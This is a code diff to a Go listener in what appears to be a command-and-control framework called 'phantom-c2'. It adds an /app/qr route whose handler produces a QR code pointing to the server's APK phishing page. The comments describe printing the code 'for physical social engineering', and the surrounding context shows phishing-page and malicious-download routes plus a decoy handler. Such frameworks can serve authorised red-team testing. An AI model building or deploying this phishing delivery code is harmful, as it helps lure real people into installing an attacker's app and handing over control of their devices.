@@ -15,6 +15,7 @@ import (
 	"github.com/phantom-c2/phantom/internal/agent"
 	"github.com/phantom-c2/phantom/internal/db"
 	"github.com/phantom-c2/phantom/internal/crypto"
+	"github.com/phantom-c2/phantom/internal/payloads"
 	"github.com/phantom-c2/phantom/internal/protocol"
 	"github.com/phantom-c2/phantom/internal/task"
 )
@@ -103,6 +104,7 @@ func (l *HTTPListener) Start() error {
 	// APK delivery — phishing page at /app, direct download at /app/download
 	mux.HandleFunc("/app", l.handleAPKPage)
 	mux.HandleFunc("/app/download", l.handleAPKDownload)
+	mux.HandleFunc("/app/qr", l.handleQRCode)
 
 	// Catch-all for any other request
 	mux.HandleFunc("/", l.handleDecoy)
@@ -524,6 +526,30 @@ func findProjectRoot() string {
 		dir = parent
 	}
 	return "."
+}
+
+// handleQRCode generates a QR code PNG pointing to the /app phishing page.
+// Access at http://C2:PORT/app/qr — save or print for physical social engineering.
+func (l *HTTPListener) handleQRCode(w http.ResponseWriter, r *http.Request) {
+	// Build the phishing URL using the listener's public address
+	host := r.Host
+	if host == "" {
+		host = l.BindAddr
+	}
+	scheme := "http"
+	if l.TLSCert != "" {
+		scheme = "https"
+	}
+	phishURL := scheme + "://" + host + "/app"
+
+	qrPNG := payloads.GenerateQRCode(phishURL, 400)
+
+	l.emitEvent("qr_generated", extractIP(r), phishURL)
+
+	w.Header().Set("Content-Type", "image/png")
+	w.Header().Set("Content-Disposition", `inline; filename="phantom-qr.png"`)
+	w.Header().Set("Cache-Control", "no-store")
+	w.Write(qrPNG)
 }
 
 // handleDecoy serves fake responses to non-agent traffic.
